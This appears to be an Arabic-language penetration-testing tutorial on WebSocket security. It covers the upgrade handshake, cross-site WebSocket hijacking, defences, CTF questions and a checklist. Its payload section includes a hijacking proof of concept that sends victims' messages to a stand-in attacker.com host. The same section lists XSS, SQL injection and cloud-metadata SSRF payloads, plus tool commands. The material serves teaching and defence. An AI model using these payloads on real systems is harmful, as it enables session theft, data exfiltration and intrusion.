اختبار أمان WebSockets (WebSocket Security Testing)

بروتوكول WebSockets يوفر اتصالاً ثنائي الاتجاه (Bi-directional) ومتزامناً (Full-duplex) عبر اتصال TCP واحد طويل الأمد. نظراً لأن هذا البروتوكول يختلف جذرياً عن بروتوكول HTTP التقليدي من حيث إدارة الجلسات ونقل البيانات، فإنه يفتح المجال واسعاً لهجمات معقدة مثل CSWSH (اختطاف جلسات WebSocket عبر المواقع) وثغرات الحقن (XSS, SQLi) عبر الرسائل المتبادلة.

CSWSH CVSS: 7.5 - 9.8 ws:// / wss:// Real-time Apps

📚 الغوص العميق في النظرية (Theory Deep-Dive)

كيفية عمل بروتوكول WebSocket (HTTP Upgrade Handshake)

يبدأ اتصال WebSocket كطلب HTTP عادي، لكنه يحتوي على ترويسات (Headers) خاصة تطلب من الخادم ترقية الاتصال (Upgrade) من HTTP إلى WebSocket. إذا وافق الخادم، يرد برمز الحالة 101 Switching Protocols.

  • ws:// غير مشفر (يماثل HTTP). يعمل عادة على المنفذ 80.
  • wss:// مشفر باستخدام TLS (يماثل HTTPS). يعمل عادة على المنفذ 443.

يتم استخدام ترويسة Sec-WebSocket-Key للتأكد من أن الخادم يفهم بروتوكول WebSocket ويمنع عمليات التخزين المؤقت (Caching) الخاطئة.

مفهوم التأكد من المصدر (Origin Checking) والمصادقة (Authentication)

على عكس طلبات AJAX/CORS في HTTP، لا تقوم متصفحات الويب بتقييد اتصالات WebSocket بسياسة نفس المصدر (Same-Origin Policy). يتم إرسال ترويسة Origin مع طلب الاتصال المبدئي، وتقع مسؤولية التحقق من هذا المصدر على عاتق الخادم (Server). إذا لم يتحقق الخادم من صحة المصدر، يمكن لأي موقع خبيث فتح اتصال WebSocket مع خادم التطبيق باستخدام جلسة الضحية (ملفات تعريف الارتباط أو Cookies تُرسل تلقائياً).

بالنسبة للمصادقة، يمكن أن تتم إما عبر Cookies أثناء طلب Handshake، أو كأول رسالة يتم إرسالها عبر الـ WebSocket (مثل إرسال JWT Token داخل رسالة JSON).

هيكل إطار البيانات (WebSocket Frame Structure)

تتم تجزئة البيانات المرسلة عبر WebSocket إلى أطر (Frames). كل إطار يحتوي على Opcode يحدد نوع البيانات (0x1 للنصوص، 0x2 للبيانات الثنائية، 0x8 للإغلاق، 0x9 لـ Ping، 0xA لـ Pong). يتم عمل Masking للبيانات المرسلة من العميل إلى الخادم لتجنب هجمات التسمم عبر وسيط التخزين (Cache Poisoning).

🔬 تشريح الهجوم (Attack Anatomy) - هجوم CSWSH

هجوم اختطاف جلسات WebSockets عبر المواقع (Cross-Site WebSocket Hijacking - CSWSH) هو المكافئ لهجمات CSRF في عالم WebSockets ولكنه أخطر، لأنه يسمح للمهاجم بقراءة الرسائل (Two-way) وليس فقط إرسالها (One-way).

الخطوات التفصيلية للهجوم:
  1. الخطوة 1: يقوم المهاجم بإنشاء صفحة ويب خبيثة (Attacker Page) تحتوي على كود JavaScript للاتصال بخادم WebSocket الخاص بالتطبيق الهدف wss://target.com/chat.
  2. الخطوة 2: يخدع المهاجم الضحية لزيارة هذه الصفحة الخبيثة. الضحية مسجلة الدخول بالفعل في الموقع الهدف (تملك Session Cookies نشطة).
  3. الخطوة 3: ينفذ متصفح الضحية كود المهاجم ويفتح اتصال WebSocket. نظراً لأنه يتم إرسال الـ Cookies تلقائياً في طلب الـ Handshake المبدئي، يتم المصادقة على الاتصال بنجاح.
  4. الخطوة 4: الموقع الهدف لا يتحقق من ترويسة Origin القادمة من موقع المهاجم، ويقبل الاتصال.
  5. الخطوة 5: يستطيع كود المهاجم الآن إرسال واستقبال الرسائل نيابة عن الضحية. يمكن للمهاجم إرسال طلب استرجاع البيانات الحساسة أو الرسائل الخاصة، ثم يقوم بإعادة إرسالها (Exfiltration) إلى خادمه الخاص (Attacker Server).

هجمات حقن البيانات (Injection Attacks via WebSockets)

إذا كانت البيانات المرسلة عبر رسائل WebSockets لا يتم تعقيمها (Sanitization)، يمكن استغلالها لتنفيذ هجمات مثل:

  • XSS (Cross-Site Scripting): إرسال حمولات خبيثة ليتم تنفيذها في متصفحات المستخدمين الآخرين المتصلين بنفس غرفة الدردشة.
  • SQL Injection: إذا كان الخادم يستخدم محتوى الرسالة للاستعلام من قاعدة البيانات مباشرة بدون Prepared Statements.
  • SSRF (Server-Side Request Forgery): إذا كان يمكن إرسال رسالة تطلب من الخادم جلب بيانات من عنوان داخلي.

⚡ ترسانة الحمولات (Payloads Arsenal)

حمولة استغلال CSWSH (CSWSH PoC Exploit)

كود HTML/JS يتم استضافته على موقع المهاجم لفتح اتصال، وقراءة الرسائل، ثم إرسالها للمهاجم.

<!-- index.html hosted on attacker.com -->
<script>
  // Initialize WebSocket connection to target
  var ws = new WebSocket('wss://target-app.com/ws-endpoint');
  
  ws.onopen = function() {
    // Send a message asking for sensitive data or simply wait if data is pushed automatically
    ws.send('{"action":"get_user_info"}');
  };
  
  ws.onmessage = function(event) {
    // Exfiltrate the received message to attacker's server
    var exfilData = encodeURIComponent(event.data);
    fetch('https://attacker.com/exfiltrate?data=' + exfilData);
  };
</script>

حمولات حقن رسائل WebSockets (Injection Payloads)

رسائل JSON يمكن إرسالها لاختبار وجود ثغرات في معالجة البيانات.

// XSS Payload (Testing if messages are reflected without escaping)
{"type":"chat", "message":"<img src=x onerror=alert(document.domain)>"}

// SQL Injection Payload (Testing JSON fields)
{"type":"search", "query":"' OR 1=1--"}
{"type":"search", "query":"'; WAITFOR DELAY '0:0:5'--"}

// SSRF Payload (Testing if WebSocket triggers backend fetch)
{"type":"webhook_setup", "url":"http://169.254.169.254/latest/meta-data/"}

// Message Manipulation / Privilege Escalation
{"user_id": 1234, "role": "admin", "action": "delete_user"}

📋 دليل الأوامر (Commands Playbook)

الاتصال الأساسي واختبار الردود

استخدام wscat للاتصال المباشر وتمرير الترويسات لمحاكاة الجلسة.

# Install wscat using npm
npm install -g wscat

# Connect with a specific Origin and Cookie
wscat -c wss://target.com/ws -H "Origin: https://target.com" -H "Cookie: session=123XYZ"

# Once connected, type messages to send:
> {"action":"ping"}
< {"action":"pong"}

استخدام websocat للتوجيه والتلقائية

أداة قوية للغاية لاختبار ثغرات WebSockets باستخدام سكربتات bash.

# Simple connection
websocat wss://target.com/ws

# Connect ignoring TLS errors (insecure)
websocat --insecure wss://target.com/ws

# Read payloads from a file and send them line by line
websocat wss://target.com/ws < payloads.txt

# Pipe commands into websocket and see response
echo '{"query":"admin"}' | websocat wss://target.com/ws

سكربت Python للاتصال المخصص (Custom Fuzzer)

مثال لكيفية كتابة سكربت Python بسيط للتواصل التلقائي وإرسال الحمولات.

import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")

def on_error(ws, error):
    print(f"Error: {error}")

def on_close(ws, close_status_code, close_msg):
    print("Connection closed")

def on_open(ws):
    print("Connection opened!")
    # Send a malicious payload
    payload = {"type":"chat", "msg":"<script>alert(1)</script>"}
    ws.send(json.dumps(payload))

if __name__ == "__main__":
    headers = ["Origin: https://target.com", "Cookie: session_id=12345"]
    ws = websocket.WebSocketApp("wss://target.com/chat",
                              header=headers,
                              on_open=on_open,
                              on_message=on_message,
                              on_error=on_error,
                              on_close=on_close)
    ws.run_forever()

🏆 دراسات حالة حقيقية (Real-World Cases)

1. حالة PortSwigger: اختطاف جلسة الدردشة (CSWSH)

السيناريو: تطبيق دردشة مبني على WebSockets لم يتحقق من ترويسة Origin أو يطلب Tokens ضمن رسائل الاتصال. الاستغلال: استخدم المهاجم صفحة ويب خارجية تقوم بالاتصال بـ wss://chat.app/ws وتعتمد على Session Cookies الموجودة في المتصفح. عند فتح الاتصال بنجاح، يرسل المهاجم رسالة {"type":"READY"} ويقوم الخادم بالرد بسجل محادثات الضحية (Chat History). تم تسريب هذه الرسائل لخادم المهاجم.

2. تقرير HackerOne: ثغرة XSS مخزنة عبر WebSockets في تطبيق تداول

السيناريو: تطبيق لتداول الأسهم يسمح للمستخدمين بترك تعليقات تظهر في الوقت الفعلي للمتداولين الآخرين. الاستغلال: يتم نقل الرسائل عبر WebSockets بتنسيق JSON. اكتشف الباحث الأمني أن الخادم لا يقوم بتعقيم البيانات (Sanitization). قام المشتري بفتح اتصال WebSocket وإرسال رسالة: {"msg":"<img src=x onerror=alert(document.cookie)>"}. تم عكس هذه الرسالة وبثها لجميع المتداولين المتصلين حالياً، مما أدى لثغرة XSS قوية أثرت على المئات في نفس اللحظة.

🛡️ الدفاع والمعالجة (Defense & Remediation)

1. التحقق الصارم من ترويسة Origin (Strict Origin Validation)

يجب على الخادم أن يتحقق من ترويسة Origin أثناء طلب الـ Handshake ويرفض الاتصال إذا كان المصدر غير موثوق. ملاحظة: يمكن تزوير الـ Origin في برامج مخصصة، ولكن المتصفحات تمنع تعديل هذه الترويسة بواسطة جافا سكريبت، مما يحمي المستخدمين من هجمات CSWSH.

2. استخدام التوكنز للمصادقة (Tokens for Authentication)

لا تعتمد على Cookies فقط. اطلب إرسال CSRF Token أو JWT إما كمعامل في الـ URL أثناء الاتصال wss://app.com/ws?token=123، أو كأول رسالة يتم تبادلها عبر الاتصال قبل السماح بأي عمليات أخرى.

3. استخدام WSS دائماً (Enforce WSS)

تأكد من تشفير جميع اتصالات WebSockets باستخدام wss:// لمنع هجمات التجسس (Man-in-the-Middle) على مستوى الشبكة.

4. تعقيم البيانات والحد من الحجم (Sanitization & Rate Limiting)

تعامل مع البيانات القادمة من WebSockets على أنها غير موثوقة (Untrusted User Input) تماماً مثل مدخلات HTTP:

  • قم بتعقيم الرسائل لتجنب XSS و SQLi.
  • ضع حدوداً (Rate Limiting) على عدد وحجم الرسائل المرسلة لمنع هجمات حجب الخدمة (DoS).

🧪 تحديات CTF (CTF Challenge)

اختبر معلوماتك في سيناريوهات اختبار اختراق WebSockets:

السؤال 1: أثناء اختبار تطبيق يستخدم WebSockets، لاحظت أن الاتصال ينجح حتى لو قمت بتغيير ترويسة Origin إلى موقعك، ويتم المصادقة عبر ملفات تعريف الارتباط. ما هو الهجوم المحتمل هنا؟
الإجابة: هجوم اختطاف جلسة WebSocket عبر المواقع (CSWSH). يمكن للمهاجم بناء صفحة خبيثة تقرأ وترسل البيانات نيابة عن الضحية.
السؤال 2: لماذا يعتبر الاعتماد الكلي على معالجة الـ XSS في واجهة الويب (Client-Side) خطيراً في تطبيقات WebSockets للدردشة المباشرة؟
الإجابة: لأن المهاجم يمكنه الاتصال بالخادم مباشرة باستخدام أدوات مثل wscat (متجاوزاً واجهة الويب)، وإرسال حمولة خبيثة إلى الخادم، والذي سيقوم ببثها (Broadcast) لجميع المتصلين، ليتم تنفيذها على متصفحاتهم. يجب على الخادم نفسه التحقق من المحتوى (Server-Side Sanitization).
السؤال 3: كيف تقوم باختراض ثغرات SQL Injection عبر رسائل WebSockets؟
الإجابة: عن طريق اعتراض الإطارات (Frames) باستخدام Burp Suite، أو استخدام wscat، ثم تعديل قيم الحقول المرسلة في JSON بحمولات SQLi قياسية (مثل ' OR 1=1--) ومراقبة أخطاء قاعدة البيانات أو الاستجابات غير الطبيعية.

📖 ورقة المرجعية (Cheat Sheet)

أدوات واختصارات هامة

  • Burp Suite Interception: انتقل إلى Proxy > WebSockets history لمشاهدة جميع الرسائل. يمكنك استخدام Send to Repeater لتعديل الإطارات وإعادة إرسالها.
  • wscat connection: wscat -c wss://site.com/ws -H "Origin: https://site.com"
  • wscat Ignore SSL: wscat -n -c wss://site.com/ws
  • websocat piping: cat payloads.txt | websocat wss://site.com/ws

قائمة التحقق الأمني لـ WebSockets (Pentesting Checklist)

  1. هل يتم استخدام wss:// وليس ws://؟
  2. هل يتحقق الخادم من ترويسة Origin لحماية ضد CSWSH؟
  3. هل توجد آلية مصادقة قوية غير الـ Cookies المعتادة (مثل CSRF Tokens أو JWTs في الرسائل الأولى)؟
  4. هل يتم تعقيم البيانات المرسلة من العميل قبل معالجتها وبثها (XSS/SQLi)؟
  5. هل يضع الخادم قيوداً على معدل وحجم الرسائل (Rate/Size Limits)؟
